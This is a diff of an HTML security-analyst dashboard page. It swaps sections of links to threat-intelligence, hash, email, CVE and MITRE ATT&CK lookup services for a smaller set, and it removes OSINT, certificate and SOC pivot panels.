+          <a id="url_redirectdetective" target="_blank" rel="noopener noreferrer"><div class="title">Redirect Detective</div><div class="meta" data-meta="url_redirectdetective"></div></a>
+          <a id="url_browserling" target="_blank" rel="noopener noreferrer"><div class="title">Browserling</div><div class="meta" data-meta="url_browserling"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== EMAIL & BREACH ===================== -->
-      <div class="tool-section" data-type="email">
-        <div class="section-head"><h2>📧 Email & Breach</h2><div class="pill">Email pivots</div></div>
+      <section class="tool-section" data-type="hash">
+        <div class="section-head">
+          <h2>🧬 Hash Intelligence</h2>
+          <div class="pill">Hash pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="em_hunter" target="_blank"><div class="title">🧾 Hunter.io <span class="lock">🔒</span></div><div class="meta" data-meta="em_hunter"></div></a>
-          <a id="em_hibp" target="_blank"><div class="title">🧨 HaveIBeenPwned <span class="lock">🔒</span></div><div class="meta" data-meta="em_hibp"></div></a>
-          <a id="em_intelbase" target="_blank"><div class="title">🕵️ IntelBase <span class="lock">🔒</span></div><div class="meta" data-meta="em_intelbase"></div></a>
-          <a id="em_emailrep" target="_blank"><div class="title">📊 EmailRep.io <span class="lock">🔒</span></div><div class="meta" data-meta="em_emailrep"></div></a>
-          <a id="em_epieos" target="_blank"><div class="title">🔬 Epieos (OSINT) <span class="lock">🔒</span></div><div class="meta" data-meta="em_epieos"></div></a>
-          <a id="em_intelx" target="_blank"><div class="title">📡 IntelX <span class="lock">🔒</span></div><div class="meta" data-meta="em_intelx"></div></a>
-          <a id="em_phonebook" target="_blank"><div class="title">📒 Phonebook.cz <span class="lock">🔒</span></div><div class="meta" data-meta="em_phonebook"></div></a>
-          <a id="em_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="em_dehashed"></div></a>
+          <a id="hash_vt" target="_blank" rel="noopener noreferrer"><div class="title">VirusTotal</div><div class="meta" data-meta="hash_vt"></div></a>
+          <a id="hash_otx" target="_blank" rel="noopener noreferrer"><div class="title">AlienVault OTX</div><div class="meta" data-meta="hash_otx"></div></a>
+          <a id="hash_triage" target="_blank" rel="noopener noreferrer"><div class="title">Triage</div><div class="meta" data-meta="hash_triage"></div></a>
+          <a id="hash_mbazaar" target="_blank" rel="noopener noreferrer"><div class="title">MalwareBazaar</div><div class="meta" data-meta="hash_mbazaar"></div></a>
+          <a id="hash_hybrid" target="_blank" rel="noopener noreferrer"><div class="title">Hybrid Analysis</div><div class="meta" data-meta="hash_hybrid"></div></a>
+          <a id="hash_joesandbox" target="_blank" rel="noopener noreferrer"><div class="title">Joe Sandbox</div><div class="meta" data-meta="hash_joesandbox"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== EMAIL HEADERS ===================== -->
-      <div class="tool-section" data-type="header">
-        <div class="section-head"><h2>🧾 Email Header Deep Analyzer</h2><div class="pill">Phishing investigation</div></div>
-        <!-- Inline analyzer panel -->
-        <div class="eha-panel">
-          <div class="eha-input-row">
-            <textarea id="eha-input" spellcheck="false" placeholder="Paste raw email headers here (everything from Received: to the body)..."></textarea>
-            <div class="eha-input-actions">
-              <button id="eha-analyze-btn" type="button">🔍 Analyze Headers</button>
-              <button id="eha-clear-btn" type="button">🗑 Clear</button>
-            </div>
-          </div>
-          <div id="eha-results" style="display:none">
-            <!-- Score banner -->
-            <div id="eha-score-banner" class="eha-score-banner"></div>
-            <!-- Summary grid -->
-            <div id="eha-summary" class="eha-summary-grid"></div>
-            <!-- Auth results -->
-            <div id="eha-auth" class="eha-auth-row"></div>
-            <!-- Hop chain -->
-            <div class="eha-section-label">📡 Relay Hop Chain (oldest → newest)</div>
-            <div id="eha-hops" class="eha-hops-table"></div>
-            <!-- Flags -->
-            <div id="eha-flags" class="eha-flags-list"></div>
-            <!-- Pivot actions -->
-            <div id="eha-pivots" class="eha-pivot-row"></div>
-          </div>
+      <section class="tool-section" data-type="email">
+        <div class="section-head">
+          <h2>✉️ Email Intelligence</h2>
+          <div class="pill">Email pivots</div>
         </div>
-        <!-- External tools -->
-        <div class="eha-ext-label">External Analyzers</div>
         <div class="tool-grid">
-          <a id="hdr_mha" target="_blank"><div class="title">🧩 Microsoft Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_mha"></div></a>
-          <a id="hdr_google" target="_blank"><div class="title">🧰 Google Messageheader <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_google"></div></a>
-          <a id="hdr_mxtoolbox" target="_blank"><div class="title">📧 MXToolbox Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_mxtoolbox"></div></a>
-          <a id="hdr_traceemail" target="_blank"><div class="title">🧵 Trace Email <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_traceemail"></div></a>
-          <a id="hdr_dnschecker" target="_blank"><div class="title">🧪 DNSChecker Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_dnschecker"></div></a>
+          <a id="email_google" target="_blank" rel="noopener noreferrer"><div class="title">Google Search</div><div class="meta" data-meta="email_google"></div></a>
+          <a id="email_hunter" target="_blank" rel="noopener noreferrer"><div class="title">Hunter</div><div class="meta" data-meta="email_hunter"></div></a>
+          <a id="email_intelx" target="_blank" rel="noopener noreferrer"><div class="title">Intelligence X</div><div class="meta" data-meta="email_intelx"></div></a>
+          <a id="email_haveibeenpwned" target="_blank" rel="noopener noreferrer"><div class="title">HIBP</div><div class="meta" data-meta="email_haveibeenpwned"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== HASH ===================== -->
-      <div class="tool-section" data-type="hash">
-        <div class="section-head"><h2>🔒 Hash Lookup</h2><div class="pill">File pivots</div></div>
+      <section class="tool-section" data-type="header">
+        <div class="section-head">
+          <h2>📨 Email Header Analysis</h2>
+          <div class="pill">Header review</div>
+        </div>
         <div class="tool-grid">
-          <a id="h_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="h_vt"></div></a>
-          <a id="h_hybrid" target="_blank"><div class="title">🧫 Hybrid-Analysis <span class="lock">🔒</span></div><div class="meta" data-meta="h_hybrid"></div></a>
-          <a id="h_joesandbox" target="_blank"><div class="title">🧪 JOE Sandbox <span class="lock">🔒</span></div><div class="meta" data-meta="h_joesandbox"></div></a>
-          <a id="h_triage" target="_blank"><div class="title">🧯 Triage <span class="lock">🔒</span></div><div class="meta" data-meta="h_triage"></div></a>
-          <a id="h_malshare" target="_blank"><div class="title">📦 MalShare <span class="lock">🔒</span></div><div class="meta" data-meta="h_malshare"></div></a>
-          <a id="h_malwarebazaar" target="_blank"><div class="title">🦠 MalwareBazaar <span class="lock">🔒</span></div><div class="meta" data-meta="h_malwarebazaar"></div></a>
-          <a id="h_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="h_ibmxf"></div></a>
-          <a id="h_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="h_talos"></div></a>
-          <a id="h_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="h_otx"></div></a>
-          <a id="h_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="h_anyrun"></div></a>
-          <a id="h_threatminer" target="_blank"><div class="title">⛏ ThreatMiner <span class="lock">🔒</span></div><div class="meta" data-meta="h_threatminer"></div></a>
-          <a id="h_intezer" target="_blank"><div class="title">🧬 Intezer Analyze <span class="lock">🔒</span></div><div class="meta" data-meta="h_intezer"></div></a>
-          <a id="h_cyberchef" target="_blank"><div class="title">🧪 CyberChef <span class="lock">🔒</span></div><div class="meta" data-meta="h_cyberchef"></div></a>
-          <a id="h_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="h_nitter"></div></a>
+          <a id="hdr_google_from" target="_blank" rel="noopener noreferrer"><div class="title">Search From Domain</div><div class="meta" data-meta="hdr_google_from"></div></a>
+          <a id="hdr_google_ip" target="_blank" rel="noopener noreferrer"><div class="title">Search Origin IP</div><div class="meta" data-meta="hdr_google_ip"></div></a>
+          <a id="hdr_vt_ip" target="_blank" rel="noopener noreferrer"><div class="title">Origin IP VT</div><div class="meta" data-meta="hdr_vt_ip"></div></a>
+          <a id="hdr_otx_ip" target="_blank" rel="noopener noreferrer"><div class="title">Origin IP OTX</div><div class="meta" data-meta="hdr_otx_ip"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== USERNAME ===================== -->
-      <div class="tool-section" data-type="username">
-        <div class="section-head"><h2>👤 Username / Account OSINT</h2><div class="pill">Account pivots</div></div>
+      <section class="tool-section" data-type="cve">
+        <div class="section-head">
+          <h2>🛠 CVE Intelligence</h2>
+          <div class="pill">Vulnerability pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="usr_namechk" target="_blank"><div class="title">🧾 Namechk <span class="lock">🔒</span></div><div class="meta" data-meta="usr_namechk"></div></a>
-          <a id="usr_whatsmyname" target="_blank"><div class="title">🕵️ WhatsMyName <span class="lock">🔒</span></div><div class="meta" data-meta="usr_whatsmyname"></div></a>
-          <a id="usr_maigret" target="_blank"><div class="title">🔭 Maigret (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="usr_maigret"></div></a>
-          <a id="usr_sherlock" target="_blank"><div class="title">🔍 Sherlock (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="usr_sherlock"></div></a>
-          <a id="usr_socialsearcher" target="_blank"><div class="title">📡 Social Searcher <span class="lock">🔒</span></div><div class="meta" data-meta="usr_socialsearcher"></div></a>
-          <a id="usr_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="usr_dehashed"></div></a>
-          <a id="usr_intelx" target="_blank"><div class="title">📡 IntelX <span class="lock">🔒</span></div><div class="meta" data-meta="usr_intelx"></div></a>
-          <a id="usr_breachdir" target="_blank"><div class="title">🧯 Breach Directory <span class="lock">🔒</span></div><div class="meta" data-meta="usr_breachdir"></div></a>
-          <a id="usr_leakcheck" target="_blank"><div class="title">💧 LeakCheck <span class="lock">🔒</span></div><div class="meta" data-meta="usr_leakcheck"></div></a>
-          <a id="usr_spiderfoot" target="_blank"><div class="title">🕷 SpiderFoot HX <span class="lock">🔒</span></div><div class="meta" data-meta="usr_spiderfoot"></div></a>
-          <a id="usr_github" target="_blank"><div class="title">🐙 GitHub Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_github"></div></a>
-          <a id="usr_twitter" target="_blank"><div class="title">🐦 Twitter / X <span class="lock">🔒</span></div><div class="meta" data-meta="usr_twitter"></div></a>
-          <a id="usr_reddit" target="_blank"><div class="title">🔴 Reddit Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_reddit"></div></a>
-          <a id="usr_tiktok" target="_blank"><div class="title">🎵 TikTok Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_tiktok"></div></a>
-          <a id="usr_instagram" target="_blank"><div class="title">📸 Instagram <span class="lock">🔒</span></div><div class="meta" data-meta="usr_instagram"></div></a>
-          <a id="usr_linkedin" target="_blank"><div class="title">💼 LinkedIn Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_linkedin"></div></a>
-          <a id="usr_snapchat" target="_blank"><div class="title">👻 Snapchat <span class="lock">🔒</span></div><div class="meta" data-meta="usr_snapchat"></div></a>
-          <a id="usr_telegram" target="_blank"><div class="title">✈️ Telegram <span class="lock">🔒</span></div><div class="meta" data-meta="usr_telegram"></div></a>
-          <a id="usr_discord" target="_blank"><div class="title">🎮 Discord Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="usr_discord"></div></a>
-          <a id="usr_pastebin" target="_blank"><div class="title">📋 Pastebin Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_pastebin"></div></a>
-          <a id="usr_nitter" target="_blank"><div class="title">🐦 Nitter Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_nitter"></div></a>
+          <a id="cve_nvd" target="_blank" rel="noopener noreferrer"><div class="title">NVD</div><div class="meta" data-meta="cve_nvd"></div></a>
+          <a id="cve_cveorg" target="_blank" rel="noopener noreferrer"><div class="title">CVE.org</div><div class="meta" data-meta="cve_cveorg"></div></a>
+          <a id="cve_cisa" target="_blank" rel="noopener noreferrer"><div class="title">CISA KEV</div><div class="meta" data-meta="cve_cisa"></div></a>
+          <a id="cve_exploitdb" target="_blank" rel="noopener noreferrer"><div class="title">Exploit-DB</div><div class="meta" data-meta="cve_exploitdb"></div></a>
+          <a id="cve_vulners" target="_blank" rel="noopener noreferrer"><div class="title">Vulners</div><div class="meta" data-meta="cve_vulners"></div></a>
+          <a id="cve_github" target="_blank" rel="noopener noreferrer"><div class="title">GitHub Search</div><div class="meta" data-meta="cve_github"></div></a>
+          <a id="cve_socradar" target="_blank" rel="noopener noreferrer"><div class="title">SOCRadar</div><div class="meta" data-meta="cve_socradar"></div></a>
+          <a id="cve_rapid7" target="_blank" rel="noopener noreferrer"><div class="title">AttackerKB</div><div class="meta" data-meta="cve_rapid7"></div></a>
+          <a id="cve_snyk" target="_blank" rel="noopener noreferrer"><div class="title">Snyk</div><div class="meta" data-meta="cve_snyk"></div></a>
+          <a id="cve_nuclei" target="_blank" rel="noopener noreferrer"><div class="title">Nuclei Search</div><div class="meta" data-meta="cve_nuclei"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== PHONE ===================== -->
-      <div class="tool-section" data-type="phone">
-        <div class="section-head"><h2>📞 Phone Number OSINT</h2><div class="pill">Phone pivots</div></div>
+      <section class="tool-section" data-type="mitre">
+        <div class="section-head">
+          <h2>🎯 MITRE ATT&amp;CK</h2>
+          <div class="pill">Technique pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="ph_truecaller" target="_blank"><div class="title">📞 Truecaller <span class="lock">🔒</span></div><div class="meta" data-meta="ph_truecaller"></div></a>
-          <a id="ph_numverify" target="_blank"><div class="title">🔢 NumVerify <span class="lock">🔒</span></div><div class="meta" data-meta="ph_numverify"></div></a>
-          <a id="ph_phoneinfoga" target="_blank"><div class="title">🕵️ PhoneInfoga (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="ph_phoneinfoga"></div></a>
-          <a id="ph_eyecon" target="_blank"><div class="title">👁 Eyecon Caller ID <span class="lock">🔒</span></div><div class="meta" data-meta="ph_eyecon"></div></a>
-          <a id="ph_calleridtest" target="_blank"><div class="title">🆔 CallerID Test <span class="lock">🔒</span></div><div class="meta" data-meta="ph_calleridtest"></div></a>
-          <a id="ph_intelx" target="_blank"><div class="title">📡 IntelX Search <span class="lock">🔒</span></div><div class="meta" data-meta="ph_intelx"></div></a>
-          <a id="ph_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="ph_dehashed"></div></a>
-          <a id="ph_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="ph_google"></div></a>
+          <a id="mitre_attack" target="_blank" rel="noopener noreferrer"><div class="title">MITRE ATT&amp;CK</div><div class="meta" data-meta="mitre_attack"></div></a>
+          <a id="mitre_google" target="_blank" rel="noopener noreferrer"><div class="title">Google Search</div><div class="meta" data-meta="mitre_google"></div></a>
         </div>
-      </div>
+      </section>
+    </section>
 
-      <!-- ===================== MAC ADDRESS ===================== -->
-      <div class="tool-section" data-type="mac">
-        <div class="section-head"><h2>🖧 MAC Address Lookup</h2><div class="pill">Hardware pivots</div></div>
-        <div class="tool-grid">
-          <a id="mac_macvendors" target="_blank"><div class="title">🏭 MAC Vendors <span class="lock">🔒</span></div><div class="meta" data-meta="mac_macvendors"></div></a>
-          <a id="mac_maclookup" target="_blank"><div class="title">🔍 MAC Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="mac_maclookup"></div></a>
-          <a id="mac_wireshark_oui" target="_blank"><div class="title">🦈 Wireshark OUI DB <span class="lock">🔒</span></div><div class="meta" data-meta="mac_wireshark_oui"></div></a>
-          <a id="mac_google" target="_blank"><div class="title">🔎 Google OUI Search <span class="lock">🔒</span></div><div class="meta" data-meta="mac_google"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== ASN ===================== -->
-      <div class="tool-section" data-type="asn">
-        <div class="section-head"><h2>🌐 ASN / BGP Lookup</h2><div class="pill">Network pivots</div></div>
-        <div class="tool-grid">
-          <a id="asn_bgphe" target="_blank"><div class="title">🌐 BGP.he.net <span class="lock">🔒</span></div><div class="meta" data-meta="asn_bgphe"></div></a>
-          <a id="asn_ripestat" target="_blank"><div class="title">🗃 RIPEstat <span class="lock">🔒</span></div><div class="meta" data-meta="asn_ripestat"></div></a>
-          <a id="asn_asnlookup" target="_blank"><div class="title">🔭 ASN Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="asn_asnlookup"></div></a>
-          <a id="asn_ipinfo" target="_blank"><div class="title">🗺 IPinfo ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_ipinfo"></div></a>
-          <a id="asn_shodan" target="_blank"><div class="title">🛰 Shodan ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_shodan"></div></a>
-          <a id="asn_greynoise" target="_blank"><div class="title">🌫 GreyNoise ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_greynoise"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== CRYPTO WALLET ===================== -->
-      <div class="tool-section" data-type="btc">
-        <div class="section-head"><h2>₿ Crypto Wallet Lookup</h2><div class="pill">Blockchain pivots</div></div>
-        <div class="tool-grid">
-          <a id="btc_blockchain" target="_blank"><div class="title">⛓ Blockchain.com <span class="lock">🔒</span></div><div class="meta" data-meta="btc_blockchain"></div></a>
-          <a id="btc_blockchair" target="_blank"><div class="title">🪑 Blockchair <span class="lock">🔒</span></div><div class="meta" data-meta="btc_blockchair"></div></a>
-          <a id="btc_walletexplorer" target="_blank"><div class="title">🔍 WalletExplorer <span class="lock">🔒</span></div><div class="meta" data-meta="btc_walletexplorer"></div></a>
-          <a id="btc_otx" target="_blank"><div class="title">👽 OTX Search <span class="lock">🔒</span></div><div class="meta" data-meta="btc_otx"></div></a>
-          <a id="btc_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="btc_google"></div></a>
-        </div>
-      </div>
-      <div class="tool-section" data-type="eth">
-        <div class="section-head"><h2>Ξ ETH Wallet Lookup</h2><div class="pill">Ethereum pivots</div></div>
-        <div class="tool-grid">
-          <a id="eth_etherscan" target="_blank"><div class="title">🔬 Etherscan <span class="lock">🔒</span></div><div class="meta" data-meta="eth_etherscan"></div></a>
-          <a id="eth_blockchair" target="_blank"><div class="title">🪑 Blockchair ETH <span class="lock">🔒</span></div><div class="meta" data-meta="eth_blockchair"></div></a>
-          <a id="eth_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="eth_google"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== CVE LOOKUP ===================== -->
-      <div class="tool-section" data-type="cve">
-        <div class="section-head"><h2>🧷 CVE Lookup</h2><div class="pill">Vulnerability pivots</div></div>
-        <div class="tool-grid">
-          <a id="cve_nvd" target="_blank"><div class="title">📄 NVD (NIST) <span class="lock">🔒</span></div><div class="meta" data-meta="cve_nvd"></div></a>
-          <a id="cve_cveorg" target="_blank"><div class="title">🧾 CVE.org Record <span class="lock">🔒</span></div><div class="meta" data-meta="cve_cveorg"></div></a>
-          <a id="cve_cisa" target="_blank"><div class="title">🧨 CISA KEV (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="cve_cisa"></div></a>
-          <a id="cve_exploitdb" target="_blank"><div class="title">💥 Exploit-DB <span class="lock">🔒</span></div><div class="meta" data-meta="cve_exploitdb"></div></a>
-          <a id="cve_vulners" target="_blank"><div class="title">🧠 Vulners <span class="lock">🔒</span></div><div class="meta" data-meta="cve_vulners"></div></a>
-          <a id="cve_github" target="_blank"><div class="title">🧑‍💻 GitHub PoC Search <span class="lock">🔒</span></div><div class="meta" data-meta="cve_github"></div></a>
-          <a id="cve_socradar" target="_blank"><div class="title">📡 SOCRadar CVE Intel <span class="lock">🔒</span></div><div class="meta" data-meta="cve_socradar"></div></a>
-          <a id="cve_rapid7" target="_blank"><div class="title">⚡ Rapid7 AttackerKB <span class="lock">🔒</span></div><div class="meta" data-meta="cve_rapid7"></div></a>
-          <a id="cve_snyk" target="_blank"><div class="title">🔬 Snyk Vuln DB <span class="lock">🔒</span></div><div class="meta" data-meta="cve_snyk"></div></a>
-          <a id="cve_assetnote" target="_blank"><div class="title">🎯 Nuclei Templates Search <span class="lock">🔒</span></div><div class="meta" data-meta="cve_assetnote"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== CERTIFICATE / TLS ===================== -->
-      <div class="tool-section" data-type="cert">
-        <div class="section-head"><h2>🔐 Certificate / TLS Inspector</h2><div class="pill">Infrastructure pivot</div></div>
-        <div class="cert-panel">
-          <div class="cert-input-row">
-            <input id="cert-input" class="aw-input" type="text" placeholder="Enter domain or IP (e.g. evil.com or 185.220.101.45)"/>
-            <button id="cert-lookup-btn" type="button">🔍 Inspect Cert</button>
-            <button id="cert-history-btn" type="button">📜 Cert History</button>
-          </div>
-          <div id="cert-status" class="cert-status" style="display:none"></div>
-          <div id="cert-results" style="display:none">
-            <div id="cert-flags" class="cert-flags"></div>
-            <div id="cert-details" class="cert-details-grid"></div>
-            <div id="cert-sans-wrap" style="display:none">
-              <div class="cert-section-label">🌐 Subject Alternative Names (SANs)</div>
-              <div id="cert-sans" class="cert-sans-list"></div>
-              <button id="cert-sans-bulk" type="button" style="margin-top:8px;font-size:11px;">📋 Send all SANs to Bulk Analyzer</button>
-            </div>
-            <div id="cert-history-wrap" style="display:none">
-              <div class="cert-section-label">📜 Historical Certificates</div>
-              <div id="cert-history-list" class="cert-history-list"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ===================== CVE ↔ KEV / EPSS ===================== -->
-      <div class="tool-section" data-type="cveplus">
-        <div class="section-head"><h2>📊 CVE ↔ KEV / EPSS / Threat Intel</h2><div class="pill">Exploitability pivots</div></div>
-        <div class="tool-grid">
-          <a id="cvep_cisa_kev" target="_blank"><div class="title">🧨 CISA KEV Search <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_cisa_kev"></div></a>
-          <a id="cvep_epss" target="_blank"><div class="title">📈 EPSS Score (FIRST.org) <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_epss"></div></a>
-          <a id="cvep_socradar" target="_blank"><div class="title">📡 SOCRadar Threat Intel <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_socradar"></div></a>
-          <a id="cvep_greynoise" target="_blank"><div class="title">🌫 GreyNoise CVE Trends <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_greynoise"></div></a>
-          <a id="cvep_shodan" target="_blank"><div class="title">🛰 Shodan CVE Exposure <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_shodan"></div></a>
-          <a id="cvep_vulncheck" target="_blank"><div class="title">✅ VulnCheck KEV <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_vulncheck"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== EMAIL ARTIFACTS ===================== -->
-      <div class="tool-section" data-type="emailartifacts">
-        <div class="section-head"><h2>✉️ Email Artifacts</h2><div class="pill">Message-ID / DKIM / SPF pivots</div></div>
-        <div class="tool-grid">
-          <a id="emart_msgid_search" target="_blank"><div class="title">🔎 Message-ID Search <span class="lock">🔒</span></div><div class="meta" data-meta="emart_msgid_search"></div></a>
-          <a id="emart_dkim_domain" target="_blank"><div class="title">🔐 DKIM Domain Pivot <span class="lock">🔒</span></div><div class="meta" data-meta="emart_dkim_domain"></div></a>
-          <a id="emart_spf_domain" target="_blank"><div class="title">🧾 SPF mailfrom Pivot <span class="lock">🔒</span></div><div class="meta" data-meta="emart_spf_domain"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== LOLBINS ===================== -->
-      <div class="tool-section" data-type="lolbins">
-        <div class="section-head"><h2>🧨 LOLBINS / Living-off-the-land</h2><div class="pill">Binary / command pivots</div></div>
-        <div class="tool-grid">
-          <a id="lb_lolbas" target="_blank"><div class="title">🧰 LOLBAS (Windows) <span class="lock">🔒</span></div><div class="meta" data-meta="lb_lolbas"></div></a>
-          <a id="lb_gtfobins" target="_blank"><div class="title">🧰 GTFOBins (Linux) <span class="lock">🔒</span></div><div class="meta" data-meta="lb_gtfobins"></div></a>
-          <a id="lb_hijacklibs" target="_blank"><div class="title">🧩 HijackLibs <span class="lock">🔒</span></div><div class="meta" data-meta="lb_hijacklibs"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== WINDOWS EVENT ID ===================== -->
-      <div class="tool-section" data-type="eventid">
-        <div class="section-head"><h2>🪟 Windows Event ID Lookup</h2><div class="pill">Event pivots</div></div>
-        <div class="tool-grid">
-          <a id="ev_eventidnet" target="_blank"><div class="title">📚 EventID.net <span class="lock">🔒</span></div><div class="meta" data-meta="ev_eventidnet"></div></a>
-          <a id="ev_mslearn" target="_blank"><div class="title">📘 Microsoft Learn (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="ev_mslearn"></div></a>
-          <a id="ev_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="ev_hackthelogs"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== SYSMON ===================== -->
-      <div class="tool-section" data-type="sysmon">
-        <div class="section-head"><h2>🧾 Windows Logs / Sysmon</h2><div class="pill">Sysmon IDs + docs</div></div>
-        <div class="tool-grid">
-          <a id="sysmon_mslearn" target="_blank"><div class="title">📘 Sysmon Docs (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_mslearn"></div></a>
-          <a id="sysmon_swift" target="_blank"><div class="title">🧩 SwiftOnSecurity Sysmon Config <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_swift"></div></a>
-          <a id="sysmon_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_hackthelogs"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== SOC QUICK PIVOTS ===================== -->
-      <div class="tool-section" data-type="soc">
-        <div class="section-head"><h2>🚨 SOC Quick Pivots</h2><div class="pill">Hunt helpers</div></div>
-        <div class="tool-grid">
-          <a id="soc_ruler" target="_blank"><div class="title">🧿 RULER Project <span class="lock">🔒</span></div><div class="meta" data-meta="soc_ruler"></div></a>
-          <a id="soc_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="soc_hackthelogs"></div></a>
-          <a id="soc_explainshell" target="_blank"><div class="title">🧾 ExplainShell <span class="lock">🔒</span></div><div class="meta" data-meta="soc_explainshell"></div></a>
-          <a id="soc_sigma" target="_blank"><div class="title">📜 Sigma Rules (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="soc_sigma"></div></a>
-          <a id="soc_uncoder" target="_blank"><div class="title">⚙️ Uncoder.io (Sigma → SIEM) <span class="lock">🔒</span></div><div class="meta" data-meta="soc_uncoder"></div></a>
-        </div>
-      </div>
-
-      <!-- ===================== MITRE ATT&CK (ALWAYS) ===================== -->
-      <div class="tool-section tool-always">
-        <div class="section-head"><h2>🧩 MITRE ATT&CK Tagging</h2><div class="pill">Auto-suggested + manual tags</div></div>
-        <div id="mitre-suggested" class="mitre-suggested" style="display:none">
-          <div class="mitre-suggested-label">💡 Suggested for this IOC type:</div>
-          <div id="mitre-suggested-tags" class="mitre-suggested-tags"></div>
-        </div>
-        <div id="mitre-panel">
-          <label><input type="checkbox" value="T1595"> T1595 – Active Scanning</label>
-          <label><input type="checkbox" value="T1592"> T1592 – Gather Victim Host Info</label>
-          <label><input type="checkbox" value="T1583"> T1583 – Acquire Infrastructure</label>
-          <label><input type="checkbox" value="T1584"> T1584 – Compromise Infrastructure</label>
-          <label><input type="checkbox" value="T1566"> T1566 – Phishing</label>
-          <label><input type="checkbox" value="T1190"> T1190 – Exploit Public-Facing App</label>
-          <label><input type="checkbox" value="T1078"> T1078 – Valid Accounts</label>
-          <label><input type="checkbox" value="T1133"> T1133 – External Remote Services</label>
-          <label><input type="checkbox" value="T1059"> T1059 – Command & Scripting Interpreter</label>
-          <label><input type="checkbox" value="T1086"> T1086 – PowerShell</label>
-          <label><input type="checkbox" value="T1204"> T1204 – User Execution</label>
-          <label><input type="checkbox" value="T1047"> T1047 – Windows Management Instrumentation</label>
-          <label><input type="checkbox" value="T1053"> T1053 – Scheduled Task / Job</label>
-          <label><input type="checkbox" value="T1547"> T1547 – Boot or Logon Autostart</label>
-          <label><input type="checkbox" value="T1055"> T1055 – Process Injection</label>
-          <label><input type="checkbox" value="T1068"> T1068 – Exploitation for Privilege Escalation</label>
-          <label><input type="checkbox" value="T1027"> T1027 – Obfuscated Files or Info</label>
-          <label><input type="checkbox" value="T1218"> T1218 – Signed Binary Proxy Execution</label>
-          <label><input type="checkbox" value="T1036"> T1036 – Masquerading</label>
-          <label><input type="checkbox" value="T1110"> T1110 – Brute Force</label>
-          <label><input type="checkbox" value="T1003"> T1003 – OS Credential Dumping</label>
-          <label><input type="checkbox" value="T1557"> T1557 – Adversary-in-the-Middle</label>
-          <label><input type="checkbox" value="T1082"> T1082 – System Information Discovery</label>
-          <label><input type="checkbox" value="T1046"> T1046 – Network Service Discovery</label>
-          <label><input type="checkbox" value="T1021"> T1021 – Remote Services</label>
-          <label><input type="checkbox" value="T1114"> T1114 – Email Collection</label>
